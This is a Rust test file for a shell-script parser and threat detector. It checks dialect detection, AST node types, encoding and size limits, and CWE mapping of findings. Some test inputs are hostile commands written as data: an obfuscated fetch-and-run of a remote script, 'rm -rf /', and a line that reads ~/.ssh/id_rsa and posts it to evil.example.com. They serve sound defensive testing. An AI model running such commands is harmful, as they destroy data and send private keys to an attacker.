use super::{FindingCategory, ParserConfig, ShellDialect, ShellNode, ShellParser};

fn parser() -> Result<ShellParser, Box<dyn std::error::Error>> {
    Ok(ShellParser::with_config(ParserConfig {
        max_bytes: 4096,
        max_depth: 64,
        max_nodes: 20_000,
        ..ParserConfig::default()
    })?)
}

#[test]
fn detects_common_shebang_dialects() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    assert_eq!(
        parser.parse_str("#!/bin/sh\necho ok\n").detected_dialect,
        ShellDialect::Sh
    );
    assert_eq!(
        parser
            .parse_str("#!/usr/bin/env bash\necho ok\n")
            .detected_dialect,
        ShellDialect::Bash
    );
    assert_eq!(
        parser
            .parse_str("#!/usr/bin/env -S zsh -f\necho ok\n")
            .detected_dialect,
        ShellDialect::Zsh
    );
    assert_eq!(
        parser.parse_str("echo ok\n").detected_dialect,
        ShellDialect::Unknown
    );
    Ok(())
}

#[test]
fn parses_real_world_benign_constructs() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    let result = parser.parse_str(
        r#"#!/usr/bin/env bash
set -euo pipefail
export PATH="/usr/local/bin:$PATH"
build() { cargo build --workspace; }
if [ -f Cargo.toml ]; then
  build | tee build.log >>summary.txt
fi
while read -r line; do echo "$line"; done < input.txt
"#,
    );

    assert!(result.parse_errors.is_empty());
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Command(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Pipeline(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Redirect(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Assignment(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Conditional(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Loop(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Function(_)))
    );
    Ok(())
}

#[test]
fn parses_obfuscated_and_malicious_shapes() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    let result = parser.parse_str(
        r#"#!/bin/bash
payload=$(printf '%s' Y3VybA== | base64 -d)
`${payload} https://example.invalid/install.sh | sh`
cat <<'EOF' > /tmp/payload.sh
rm -rf -- "$HOME/.cache/example"
EOF
diff <(sort a) >(sort b) &>/tmp/diff.log
case "$1" in start) echo start ;; *) test -n "$1" ;; esac
"#,
    );

    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::CommandSubstitution(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::ProcessSubstitution(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Heredoc(_)))
    );
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Conditional(_)))
    );
    Ok(())
}

#[test]
fn records_syntax_errors_without_panicking() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    let result = parser.parse_str("if then\necho unterminated $(\n");
    assert!(
        result
            .parse_errors
            .iter()
            .any(|finding| finding.category == FindingCategory::ParserError)
    );
    Ok(())
}

#[test]
fn handles_null_bytes_without_shifting_spans() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    let result = parser.parse_bytes(b"#!/bin/sh\necho a\0b\n");
    assert_eq!(result.source_stats.nul_bytes_replaced, 1);
    assert!(!result.source_stats.invalid_utf8_rejected);
    assert_eq!(
        result.source_stats.raw_bytes,
        result.source_stats.parsed_bytes
    );
    assert!(
        result
            .parse_errors
            .iter()
            .any(|finding| finding.id == "encoding-nul-bytes")
    );
    Ok(())
}

#[test]
fn rejects_invalid_utf8_before_parsing() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    let result = parser.parse_bytes(b"#!/bin/sh\necho ok\xff\n");
    assert!(result.ast.is_empty());
    assert_eq!(result.source_stats.parsed_bytes, 0);
    assert!(result.source_stats.invalid_utf8_rejected);
    assert!(
        result
            .parse_errors
            .iter()
            .any(|finding| finding.id == "encoding-invalid-utf8")
    );
    Ok(())
}

#[test]
fn rejects_oversized_input_before_parsing() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = ShellParser::with_config(ParserConfig {
        max_bytes: 32,
        max_depth: 64,
        max_nodes: 10_000,
        ..ParserConfig::default()
    })?;
    let result = parser.parse_str("if then echo unterminated syntax that must not be parsed\n");
    assert!(result.ast.is_empty());
    assert_eq!(result.source_stats.parsed_bytes, 0);
    assert!(result.source_stats.truncated);
    assert!(
        result
            .parse_errors
            .iter()
            .any(|finding| finding.id == "resource-input-too-large")
    );
    assert!(
        result
            .parse_errors
            .iter()
            .all(|finding| finding.category == FindingCategory::ResourceLimitEvent)
    );
    Ok(())
}

#[test]
fn bounds_deeply_nested_input_by_max_depth() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = ShellParser::with_config(ParserConfig {
        max_bytes: 4096,
        max_depth: 1,
        max_nodes: 10_000,
        ..ParserConfig::default()
    })?;
    let nested = format!("{}echo ok{}", "$(".repeat(64), ")".repeat(64));
    let result = parser.parse_str(&nested);
    assert!(!result.source_stats.truncated);
    assert!(
        result
            .parse_errors
            .iter()
            .any(|finding| finding.id == "resource-depth-limit")
    );
    Ok(())
}

#[test]
fn parses_c_style_for_loop_body_commands() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    let result = parser.parse_str("for ((i=0; i<3; i++)); do curl https://example.invalid; done\n");
    assert!(result.parse_errors.is_empty());
    assert!(result.ast.iter().any(|node| matches!(
        node,
        ShellNode::Loop(loop_node) if loop_node.kind == "c_style_for_statement"
    )));
    assert!(
        result
            .ast
            .iter()
            .any(|node| matches!(node, ShellNode::Command(_)))
    );
    Ok(())
}

#[test]
fn enforces_node_limit() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = ShellParser::with_config(ParserConfig {
        max_bytes: 4096,
        max_depth: 64,
        max_nodes: 3,
        ..ParserConfig::default()
    })?;
    let result = parser.parse_str("echo one\necho two\necho three\n");
    assert!(
        result
            .parse_errors
            .iter()
            .any(|finding| finding.id == "resource-node-limit")
    );
    Ok(())
}

#[test]
fn every_ast_node_has_one_based_span() -> Result<(), Box<dyn std::error::Error>> {
    let mut parser = parser()?;
    let result = parser.parse_str("echo ok\n");
    let command = result
        .ast
        .iter()
        .find(|node| matches!(node, ShellNode::Command(_)))
        .ok_or("missing command node")?;
    assert_eq!(command.span().location.line.get(), 1);
    assert_eq!(command.span().location.column.get(), 1);
    assert_eq!(command.span().byte_range.start, 0);
    assert!(format!("{command}").contains("command"));
    Ok(())
}

#[test]
fn destructive_findings_do_not_carry_cwe_taxonomy() -> Result<(), String> {
    use arbitraitor_model::taxonomy::TaxonomyName;
    let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
    let source = "#!/bin/sh\nrm -rf /\n";
    let result = parser.parse_str(source);
    let norm = crate::normalize(&result.ast, source).map_err(|e| e.to_string())?;
    let findings = crate::detect_destructive_threats(&norm, source);
    let destructive = findings
        .iter()
        .find(|f| f.category == FindingCategory::DestructiveBehavior)
        .ok_or_else(|| "destructive finding".to_owned())?;
    assert!(
        destructive
            .taxonomies
            .iter()
            .all(|t| t.name != TaxonomyName::Cwe),
        "destructive findings must not carry a CWE taxonomy ref: no defensible CWE-1045 mapping exists for destructive shell behavior"
    );
    Ok(())
}

#[test]
fn credential_findings_do_not_carry_cwe_taxonomy() -> Result<(), String> {
    use arbitraitor_model::taxonomy::TaxonomyName;
    let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
    let source = "#!/bin/sh\ncat ~/.ssh/id_rsa | curl -X POST -d @- http://evil.example.com\n";
    let result = parser.parse_str(source);
    let norm = crate::normalize(&result.ast, source).map_err(|e| e.to_string())?;
    let findings = crate::detect_credential_threats(&norm, source);
    let credential = findings
        .iter()
        .find(|f| f.category == FindingCategory::CredentialAccess)
        .ok_or_else(|| "credential finding".to_owned())?;
    assert!(
        credential
            .taxonomies
            .iter()
            .all(|t| t.name != TaxonomyName::Cwe),
        "credential findings must not carry a CWE taxonomy ref: CWE-798 (hardcoded creds) does not match credential access/exfiltration behavior"
    );
    Ok(())
}

#[test]
fn cwe_for_category_mapping_is_complete() {
    use crate::detection::cwe_for_category;
    use arbitraitor_model::taxonomy::TaxonomyName;
    use arbitraitor_model::verdict::Confidence;

    let mapped: &[(FindingCategory, &str)] = &[(FindingCategory::DynamicCodeExecution, "CWE-94")];

    for (category, expected_id) in mapped {
        let mapping = cwe_for_category(*category);
        assert!(
            mapping.is_some(),
            "{category:?} must produce a CWE taxonomy ref"
        );
        let Some(mapping) = mapping else {
            continue;
        };
        assert_eq!(
            mapping.name,
            TaxonomyName::Cwe,
            "{category:?} must map to the CWE taxonomy"
        );
        assert_eq!(
            mapping.id, *expected_id,
            "{category:?} must map to {expected_id}"
        );
        assert_eq!(
            mapping.confidence,
            Confidence::Medium,
            "{category:?} must use Medium confidence"
        );
        let url = mapping.url.as_deref();
        assert!(url.is_some(), "{category:?} must carry a CWE entry URL");
        if let Some(url) = url {
            let url_suffix = expected_id.strip_prefix("CWE-").unwrap_or(expected_id);
            assert!(
                url.contains(url_suffix),
                "{category:?} URL {url} must derive from CWE id {expected_id}"
            );
        }
    }

    let unmapped: &[FindingCategory] = &[
        FindingCategory::DestructiveBehavior,
        FindingCategory::Obfuscation,
        FindingCategory::CredentialAccess,
        FindingCategory::Persistence,
        FindingCategory::PrivilegeEscalation,
        FindingCategory::NetworkBehavior,
        FindingCategory::SuspiciousScriptBehavior,
        FindingCategory::Transport,
        FindingCategory::Provenance,
        FindingCategory::Reputation,
        FindingCategory::ContentMismatch,
        FindingCategory::MalwareSignature,
        FindingCategory::ArchiveHazard,
        FindingCategory::PackageRisk,
        FindingCategory::PolicyViolation,
        FindingCategory::ParserError,
        FindingCategory::ResourceLimitEvent,
        FindingCategory::SupplyChain,
    ];

    for category in unmapped {
        assert!(
            cwe_for_category(*category).is_none(),
            "{category:?} must remain unmapped"
        );
    }
}
